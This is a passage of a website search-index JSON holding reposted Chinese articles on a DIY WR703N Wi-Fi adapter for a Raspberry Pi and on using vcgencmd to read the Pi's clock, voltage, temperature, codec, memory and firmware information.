\u4e24\u79cd\u6a21\u5f0f\u6765\u5b9e\u73b0\u8fde\u63a5\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f\uff0c\u4ee5\u4fdd\u8bc1\u6240\u6709\u8bbe\u5907\u90fd\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u7f8e\u652f\u6301minidlna\u7b49upnp\u7a0b\u5e8f\u3002","title":"\u539f\u7406"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_3","text":"\u6211\u7684\u6811\u8393\u6d3e\u548c\u5916\u8bbe\u662f\u901a\u8fc7\u5927\u91cf\u7684\u87ba\u4e1d\u548c\u7a7f\u5b54\u56fa\u5b9a\u5728\u4e00\u5757\u57fa\u677f\u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5c06WR703N\u4e5f\u4f5c\u4e3a\u4e00\u4e2a\u5916\u8bbe\u56fa\u5b9a\u4e0a\u53bb\u5c31\u884c\u4e86\u3002 \u8fd9\u662f\u6ca1\u6709\u5916\u8bbe\u7684\u6837\u5b50\uff1a WR703N\u548c\u98da\u738b\u7684Hub\u56fa\u5b9a\uff0c\u901a\u8fc7\u6811\u8393\u6d3e\u7684USB\u63a5\u53e3\u76f4\u63a5\u9a71\u52a8\u4e24\u5757U\u76d8\u3001\u4e00\u4e2a\u97f3\u54cd\u548c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8c01\u8bf4\u6811\u8393\u6d3eU\u53e3\u7684\u9a71\u52a8\u80fd\u529b\u4f4e\u7684\uff1f \u7ec4\u5408\u4e00\u4e0b\uff0cDIY\u7684\u90a3\u6839\u9ed1\u8272USB\u7ebf\u5185\u90e8\u96c6\u6210\u4e86\u4e00\u9897 PL2303 \u82af\u7247\uff0c\u8fde\u63a5\u540e\u6811\u8393\u6d3e\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u8c03\u8bd5WR703N\u3002 \u4e0a\u7535\u5f00\u673a\uff0c\u5f53\u7136\uff0c\u4e0a\u7535\u4e4b\u524d\u7ecf\u5386\u4e86\u8270\u82e6\u5353\u7edd\u7684\u8c03\u8bd5\u3002","title":"\u786c\u4ef6\u8fde\u63a5"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_4","text":"\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u505a\u4e86\u4e9b\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e\u65e0\u7ebf\u7f51\u5361\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u5b8c\u5168\u7b26\u5408\u6211\u7684\u9884\u671f\uff01\u4e0b\u9762\u662f\u4e00\u4e9b\u6d4b\u8bd5\u7ed3\u679c\uff1a Samba\u8bfb\u53d6\u901f\u5ea6\u4e3a3.5~4.5 M/S. Samba\u5199\u5165\u901f\u5ea6\u4e3a3~3.3M/S. \u9891\u7e41\u901a\u8fc7Samba\u8bfb\u5199\u6811\u8393\u6d3e\u4e0a\u7684\u6587\u4ef6\uff0c\u5728\u8bfb\u53d68G\uff0c\u5199\u51655G\u7684\u6570\u636e\u4e4b\u540e\u6ca1\u6709\u51fa\u73b0\u6b7b\u673a\u5361\u6b7b\u7684\u60c5\u51b5\u3002","title":"\u6d4b\u8bd5"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_5","text":"\u4ece\u4e0a\u9762\u7684\u6d4b\u8bd5\u7ed3\u679c\u548c\u6211\u51e0\u5929\u7684\u4f7f\u7528\u60c5\u51b5\u770b\u6765\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e \u65e0\u7ebf\u7f51\u5361 \u62e5\u6709\u975e\u5e38\u53ef\u89c2\u7684\u901f\u5ea6\u548c\u7a33\u5b9a\u6027,\u53ef\u4ee5\u65e0\u89c6\u5e02\u9762\u4e0a\u5927\u90e8\u5206\u65e0\u7ebf\u7f51\u5361\u4e86\u3002 \u5728\u8c03\u8bd5\u8fd9\u6b3e\u7f51\u5361\u65f6\u82b1\u4e86\u4e0d\u5c11\u65f6\u95f4\uff0c\u65e0\u6570\u6b21\u60f3Knock my head against the wall.\u6211\u4f1a\u5c06\u8c03\u8bd5\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u8bb0\u5f55\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.shuyz.com/posts/diy-stable-wifi-adapter-for-raspberry-pi/","title":"\u603b\u7ed3"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/","text":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a \u9019\u88cf\u4ecb\u7d39\u5982\u4f55\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a\uff0c\u5373\u6642\u76e3\u63a7\u786c\u9ad4\u7684\u72c0\u614b\u3002 \u5728 Raspberry Pi \u4e2d\u6211\u5011\u53ef\u4ee5\u5229\u7528 vcgencmd \u6307\u4ee4\u4f86\u67e5\u770b\u5404\u7a2e\u7684\u786c\u9ad4\u8cc7\u8a0a\u8207\u72c0\u614b\uff0c\u4ee5\u4e0b\u662f\u5e38\u7528\u7684\u6307\u4ee4\u7bc4\u4f8b\u3002 (adsbygoogle = window.adsbygoogle || []).push({}); \u6642\u8108\u983b\u7387\uff08clock frequency\uff09 \u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_clock \u53c3\u6578\uff1a vcgencmd measure_clock <clock> \u5176\u4e2d\u7684 <clock> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 arm \u3001 core \u3001 h264 \u3001 isp \u3001 v3d \u3001 uart \u3001 pwm \u3001 emmc \u3001 pixel \u3001 vec \u3001 hdmi \u3001 dpi \u3002 \u5982\u679c\u8981\u67e5\u8a62 CPU \u7684\u6642\u8108\u983b\u7387\uff08\u4e5f\u5c31\u662f\u901f\u5ea6\uff09\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd measure_clock arm \u8f38\u51fa\u70ba frequency(45)=700000000 \u5982\u679c\u60f3\u67e5\u8a62\u6240\u6709\u7684\u786c\u9ad4\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c21\u55ae\u7684 shell \u6307\u4ee4\u7a3f\uff1a for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do \\ echo -e \"$src:\\t$(vcgencmd measure_clock $src)\" ; \\ done \u8f38\u51fa\u70ba `arm: frequency(45)=700000000 core: frequency(1)=250000000 h264: frequency(28)=250000000 isp: frequency(42)=250000000 v3d: frequency(43)=250000000 uart: frequency(22)=3000000 pwm: frequency(25)=0 emmc: frequency(47)=250000000 pixel: frequency(29)=108000000 vec: frequency(10)=0 hdmi: frequency(9)=163682000 dpi: frequency(4)=0` \u96fb\u58d3\uff08voltage\uff09 \u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u5de5\u4f5c\u96fb\u58d3\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_volts \u53c3\u6578\uff1a vcgencmd measure_volts <id> \u5176\u4e2d <id> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 core \u3001 sdram_c \u3001 sdram_i \u3001 sdram_p \u3002\u5982\u679c\u6c92\u6709\u6307\u5b9a <id> \uff0c\u5247\u9810\u8a2d\u70ba core \uff1a vcgencmd measure_volts \u8f38\u51fa\u70ba volt=1.200V \u67e5\u8a62\u6240\u6709\u5de5\u4f5c\u96fb\u58d3\u7684 shell \u6307\u4ee4\u7a3f\uff1a for id in core sdram_c sdram_i sdram_p ; do \\ echo -e \"$id:\\t$(vcgencmd measure_volts $id)\" ; \\ done \u8f38\u51fa\u70ba `core: volt=1.200V sdram_c: volt=1.200V sdram_i: volt=1.200V sdram_p: volt=1.225V` \u6eab\u5ea6\uff08temperature\uff09 \u5982\u679c\u8981\u67e5\u8a62 BCM2835 SoC \u76ee\u524d\u7684\u6eab\u5ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_temp \u53c3\u6578\uff1a vcgencmd measure_temp \u8f38\u51fa\u70ba temp=43.3\u2019C Codec \u82e5\u8981\u67e5\u8a62\u7279\u5b9a\u7684 codec \u6709\u6c92\u6709\u555f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 codec_enabled \u53c3\u6578\uff1a vcgencmd codec_enabled <codec> \u5176\u4e2d <codec> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684 codec\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709\uff1a H264 \u3001 MPG2 \u3001 WVC1 \u3001 MPG4 \u3001 MJPG \u3001 WMV9 \u3002 \u67e5\u8a62\u6240\u6709 codec \u7684\u6307\u4ee4\u7a3f\uff1a for codec in H264 MPG2 WVC1 MPG4 MJPG WMV9 ; do \\ echo -e \"$codec:\\t$(vcgencmd codec_enabled $codec)\" ; \\ done \u8f38\u51fa\u70ba\uff1a `H264: H264=enabled MPG2: MPG2=disabled WVC1: WVC1=disabled MPG4: MPG4=enabled MJPG: MJPG=enabled WMV9: WMV9=disabled` \u8a2d\u5b9a\u503c\uff08configurations\uff09 get_config \u53c3\u6578\u53ef\u4ee5\u5217\u51fa\u76ee\u524d\u7cfb\u7d71\u4e2d\u6240\u6709\u88ab\u8a2d\u5b9a\u7684\u53c3\u6578\u503c\uff1a vcgencmd get_config [config|int|str] \u6700\u5f8c\u4e00\u500b\u53c3\u6578\u53ef\u7528\u4f86\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u8a2d\u5b9a\u503c\u540d\u7a31\u6216\u662f\u985e\u578b\uff0c\u4f8b\u5982\u67e5\u8a62 temp_limit \u7684\u6578\u503c\u53ef\u4ee5\u57f7\u884c\uff1a vcgencmd get_config temp_limit \u8f38\u51fa\u70ba temp_limit=85 \u67e5\u8a62\u6240\u6709\u6578\u503c\u8cc7\u6599\u7684\u8a2d\u5b9a\u503c\u53ef\u7528 vcgencmd get_config int \u8f38\u51fa\u70ba `hdmi_force_hotplug=1 disable_overscan=1 overscan_left=24 overscan_right=24 overscan_top=16 overscan_bottom=16 program_serial_random=1 config_hdmi_boost=4 emmc_pll_core=1 hdmi_force_cec_address=65535 framebuffer_ignore_alpha=1 framebuffer_swap=1 disable_splash=1 temp_limit=85 force_pwm_open=1 pause_burst_frames=1 second_boot=1 avoid_fix_ts=1` \u8a18\u61b6\u9ad4\u914d\u7f6e Raspberry Pi \u7684 CPU \u8207 GPU \u662f\u5171\u7528\u540c\u540c\u4e00\u500b\u8a18\u61b6\u9ad4\u7684\uff0c get_mem \u53c3\u6578\u53ef\u4ee5\u67e5\u8a62\u76ee\u524d\u8a18\u61b6\u9ad4\u7684\u914d\u7f6e\u72c0\u614b\u3002\u67e5\u8a62\u914d\u7f6e\u7d66 CPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem arm \u8f38\u51fa\u70ba arm=448M \u67e5\u8a62\u914d\u7f6e\u7d66 GPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem gpu \u8f38\u51fa\u70ba gpu=64M \u97cc\u9ad4\u7248\u672c\uff08firmware version\uff09 \u67e5\u8a62\u97cc\u9ad4\u7248\u672c\u53ef\u4ee5\u4f7f\u7528 vcgencmd version \u8f38\u51fa\u70ba `Dec 19 2014 18:44:06 Copyright (c) 2012 Broadcom version 5abd572e2ed1811283443387af09377b95501c50 (clean) (release)` OTP \u8a18\u61b6\u9ad4 \u82e5\u8981\u67e5\u8a62 SoC \u88e1\u9762 OTP\uff08one time programmable\uff09\u8a18\u61b6\u9ad4\u7684\u5167\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 otp_dump \uff1a vcgencmd otp_dump \u8f38\u51fa\u70ba `08:00000000 09:00000000 10:00000000 11:00000000 12:00000000 13:00000000 14:00000000 15:00000000 16:00280000 17:1020000a 18:1020000a 19:ffffffff 20:ffffffff 21:ffffffff 22:ffffffff 23:ffffffff 24:ffffffff 25:ffffffff 26:ffffffff 27:0000c2c2 28:4b45c38d 29:b4ba3c72 30:00000010 31:00000000 32:00000000 33:00000000 34:00000000 35:00000000 36:00000000 37:00000000 38:00000000 39:00000000 40:00000000 41:00000000 42:00000000 43:00000000 44:00000000 45:00000000 46:00000000 47:00000000 48:00000000 49:00000000 50:00000000 51:00000000 52:00000000 53:00000000 54:00000000 55:00000000 56:00000000 57:00000000 58:00000000 59:00000000 60:00000000 61:00000000 62:00000000 63:00000000 64:00000000` \u5176\u4e2d 28 \u8207 30 \u4ee3\u8868\u786c\u9ad4\u5e8f\u865f\uff08serial\uff09\u8207\u4fee\u8a02\u7248\uff08revision\uff09\u7684\u7248\u672c\u865f\u78bc\uff0c /proc/cpuinfo \u4e2d\u6240\u986f\u793a\u7684\u5e8f\u865f\u8207\u4fee\u8a02\u7248\u672c\u865f\u78bc\u5c31\u662f\u5f9e\u9019\u88e1\u53d6\u5f97\u7684\uff0c\u800c Model B/B+ \u7684\u7db2\u8def\u5361 MAC \u5361\u865f\u4e5f\u662f\u6839\u64da\u786c\u9ad4\u5e8f\u865f\u4f86\u7522\u751f\u7684\u3002 \u67e5\u770b vcgencmd \u6240\u6709\u53ef\u7528\u7684\u53c3\u6578 \u5982\u679c\u8981\u67e5\u770b vcgencmd \u6307\u4ee4\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd commands \u8f38\u51fa\u6703\u985e\u4f3c\u9019\u6a23\uff1a commands=\u201dvcos, ap_output_control, ap_output_post_processing, vchi_test_init, vchi_test_exit, pm_set_policy, pm_get_status, pm_show_stats, pm_start_logging, pm_stop_logging, version, commands, set_vll_dir, led_control, set_backlight, set_logging, get_lcd_info, set_bus_arbiter_mode, cache_flush, otp_dump, test_result, codec_enabled, get_camera, get_mem, measure_clock, measure_volts, scaling_kernel, measure_temp, get_config, hdmi_ntsc_freqs, hdmi_adjust_clock, hdmi_status_show, hvs_update_fields, pwm_speedup, force_audio, hdmi_stream_channels, hdmi_channel_map, display_power, read_ring_osc, memtest, get_rsts, render_bar, disk_notify, inuse_notify, sus_suspend, sus_status, sus_is_enabled, sus_stop_test_thread, egl_platform_switch, mem_validate, mem_oom, mem_reloc_stats, file, vctest_memmap, vctest_start, vctest_stop, vctest_set, vctest_get\u201d \u9019\u4e9b\u5c31\u662f\u6240\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u53c3\u6578\uff0c\u9019\u4e9b\u53c3\u6578\u6703\u56e0\u70ba\u97cc\u9ad4\u7248\u672c\u4e0d\u540c\u800c\u6709\u5dee\u7570\u3002 \u5982\u679c\u60a8\u5c0d\u65bc\u6a39\u8393\u6d3e\u7684\u61c9\u7528\u6709\u8208\u8da3\uff0c\u5efa\u8b70\u60a8\u53ef\u4ee5\u7e7c\u7e8c\u95b1\u8b80 \u7269\u806f\u7db2 \u7684\u76f8\u95dc\u6587\u7ae0\u3002 \u53c3\u8003\u8cc7\u6599\uff1a Embedded Linux Wiki \u3001 raspberrypi.org \u3001 maketecheasier \u3001 lokir\u2019s linux notes (adsbygoogle = window.adsbygoogle || []).push({}); \u539f\u6587\u94fe\u63a5\uff1a https://blog.gtwang.org/iot/raspberry-pi-vcgencmd-hardware-information/","title":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#vcgencmd-raspberry-pi-cpu","text":"\u9019\u88cf\u4ecb\u7d39\u5982\u4f55\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a\uff0c\u5373\u6642\u76e3\u63a7\u786c\u9ad4\u7684\u72c0\u614b\u3002 \u5728 Raspberry Pi \u4e2d\u6211\u5011\u53ef\u4ee5\u5229\u7528 vcgencmd \u6307\u4ee4\u4f86\u67e5\u770b\u5404\u7a2e\u7684\u786c\u9ad4\u8cc7\u8a0a\u8207\u72c0\u614b\uff0c\u4ee5\u4e0b\u662f\u5e38\u7528\u7684\u6307\u4ee4\u7bc4\u4f8b\u3002 (adsbygoogle = window.adsbygoogle || []).push({});","title":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#clock-frequency","text":"\u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_clock \u53c3\u6578\uff1a vcgencmd measure_clock <clock> \u5176\u4e2d\u7684 <clock> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 arm \u3001 core \u3001 h264 \u3001 isp \u3001 v3d \u3001 uart \u3001 pwm \u3001 emmc \u3001 pixel \u3001 vec \u3001 hdmi \u3001 dpi \u3002 \u5982\u679c\u8981\u67e5\u8a62 CPU \u7684\u6642\u8108\u983b\u7387\uff08\u4e5f\u5c31\u662f\u901f\u5ea6\uff09\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd measure_clock arm \u8f38\u51fa\u70ba frequency(45)=700000000 \u5982\u679c\u60f3\u67e5\u8a62\u6240\u6709\u7684\u786c\u9ad4\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c21\u55ae\u7684 shell \u6307\u4ee4\u7a3f\uff1a for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do \\ echo -e \"$src:\\t$(vcgencmd measure_clock $src)\" ; \\ done \u8f38\u51fa\u70ba `arm: frequency(45)=700000000 core: frequency(1)=250000000 h264: frequency(28)=250000000 isp: frequency(42)=250000000 v3d: frequency(43)=250000000 uart: frequency(22)=3000000 pwm: frequency(25)=0 emmc: frequency(47)=250000000 pixel: frequency(29)=108000000 vec: frequency(10)=0 hdmi: frequency(9)=163682000 dpi: frequency(4)=0`","title":"\u6642\u8108\u983b\u7387\uff08clock frequency\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#voltage","text":"\u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u5de5\u4f5c\u96fb\u58d3\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_volts \u53c3\u6578\uff1a vcgencmd measure_volts <id> \u5176\u4e2d <id> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 core \u3001 sdram_c \u3001 sdram_i \u3001 sdram_p \u3002\u5982\u679c\u6c92\u6709\u6307\u5b9a <id> \uff0c\u5247\u9810\u8a2d\u70ba core \uff1a vcgencmd measure_volts \u8f38\u51fa\u70ba volt=1.200V \u67e5\u8a62\u6240\u6709\u5de5\u4f5c\u96fb\u58d3\u7684 shell \u6307\u4ee4\u7a3f\uff1a for id in core sdram_c sdram_i sdram_p ; do \\ echo -e \"$id:\\t$(vcgencmd measure_volts $id)\" ; \\ done \u8f38\u51fa\u70ba `core: volt=1.200V sdram_c: volt=1.200V sdram_i: volt=1.200V sdram_p: volt=1.225V`","title":"\u96fb\u58d3\uff08voltage\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#temperature","text":"\u5982\u679c\u8981\u67e5\u8a62 BCM2835 SoC \u76ee\u524d\u7684\u6eab\u5ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_temp \u53c3\u6578\uff1a vcgencmd measure_temp \u8f38\u51fa\u70ba temp=43.3\u2019C","title":"\u6eab\u5ea6\uff08temperature\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#codec","text":"\u82e5\u8981\u67e5\u8a62\u7279\u5b9a\u7684 codec \u6709\u6c92\u6709\u555f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 codec_enabled \u53c3\u6578\uff1a vcgencmd codec_enabled <codec> \u5176\u4e2d <codec> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684 codec\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709\uff1a H264 \u3001 MPG2 \u3001 WVC1 \u3001 MPG4 \u3001 MJPG \u3001 WMV9 \u3002 \u67e5\u8a62\u6240\u6709 codec \u7684\u6307\u4ee4\u7a3f\uff1a for codec in H264 MPG2 WVC1 MPG4 MJPG WMV9 ; do \\ echo -e \"$codec:\\t$(vcgencmd codec_enabled $codec)\" ; \\ done \u8f38\u51fa\u70ba\uff1a `H264: H264=enabled MPG2: MPG2=disabled WVC1: WVC1=disabled MPG4: MPG4=enabled MJPG: MJPG=enabled WMV9: WMV9=disabled`","title":"Codec"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#configurations","text":"get_config \u53c3\u6578\u53ef\u4ee5\u5217\u51fa\u76ee\u524d\u7cfb\u7d71\u4e2d\u6240\u6709\u88ab\u8a2d\u5b9a\u7684\u53c3\u6578\u503c\uff1a vcgencmd get_config [config|int|str] \u6700\u5f8c\u4e00\u500b\u53c3\u6578\u53ef\u7528\u4f86\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u8a2d\u5b9a\u503c\u540d\u7a31\u6216\u662f\u985e\u578b\uff0c\u4f8b\u5982\u67e5\u8a62 temp_limit \u7684\u6578\u503c\u53ef\u4ee5\u57f7\u884c\uff1a vcgencmd get_config temp_limit \u8f38\u51fa\u70ba temp_limit=85 \u67e5\u8a62\u6240\u6709\u6578\u503c\u8cc7\u6599\u7684\u8a2d\u5b9a\u503c\u53ef\u7528 vcgencmd get_config int \u8f38\u51fa\u70ba `hdmi_force_hotplug=1 disable_overscan=1 overscan_left=24 overscan_right=24 overscan_top=16 overscan_bottom=16 program_serial_random=1 config_hdmi_boost=4 emmc_pll_core=1 hdmi_force_cec_address=65535 framebuffer_ignore_alpha=1 framebuffer_swap=1 disable_splash=1 temp_limit=85 force_pwm_open=1 pause_burst_frames=1 second_boot=1 avoid_fix_ts=1`","title":"\u8a2d\u5b9a\u503c\uff08configurations\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#_1","text":"Raspberry Pi \u7684 CPU \u8207 GPU \u662f\u5171\u7528\u540c\u540c\u4e00\u500b\u8a18\u61b6\u9ad4\u7684\uff0c get_mem \u53c3\u6578\u53ef\u4ee5\u67e5\u8a62\u76ee\u524d\u8a18\u61b6\u9ad4\u7684\u914d\u7f6e\u72c0\u614b\u3002\u67e5\u8a62\u914d\u7f6e\u7d66 CPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem arm \u8f38\u51fa\u70ba arm=448M \u67e5\u8a62\u914d\u7f6e\u7d66 GPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem gpu \u8f38\u51fa\u70ba gpu=64M","title":"\u8a18\u61b6\u9ad4\u914d\u7f6e"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#firmware-version","text":"\u67e5\u8a62\u97cc\u9ad4\u7248\u672c\u53ef\u4ee5\u4f7f\u7528 vcgencmd version \u8f38\u51fa\u70ba `Dec 19 2014 18:44:06 Copyright (c) 2012 Broadcom version 5abd572e2ed1811283443387af09377b95501c50 (clean) (release)`","title":"\u97cc\u9ad4\u7248\u672c\uff08firmware version\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#otp","text":"\u82e5\u8981\u67e5\u8a62 SoC \u88e1\u9762 OTP\uff08one time programmable\uff09\u8a18\u61b6\u9ad4\u7684\u5167\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 otp_dump \uff1a vcgencmd otp_dump \u8f38\u51fa\u70ba `08:00000000 09:00000000 10:00000000 11:00000000 12:00000000 13:00000000 14:00000000 15:00000000 16:00280000 17:1020000a 18:1020000a 19:ffffffff 20:ffffffff 21:ffffffff 22:ffffffff 23:ffffffff 24:ffffffff 25:ffffffff 26:ffffffff 27:0000c2c2 28:4b45c38d 29:b4ba3c72 30:00000010 31:00000000 32:00000000 33:00000000 34:00000000 35:00000000 36:00000000 37:00000000 38:00000000 39:00000000 40:00000000 41:00000000 42:00000000 43:00000000 44:00000000 45:00000000 46:00000000 47:00000000 48:00000000 49:00000000 50:00000000 51:00000000 52:00000000 53:00000000 54:00000000 55:00000000 56:00000000 57:00000000 58:00000000 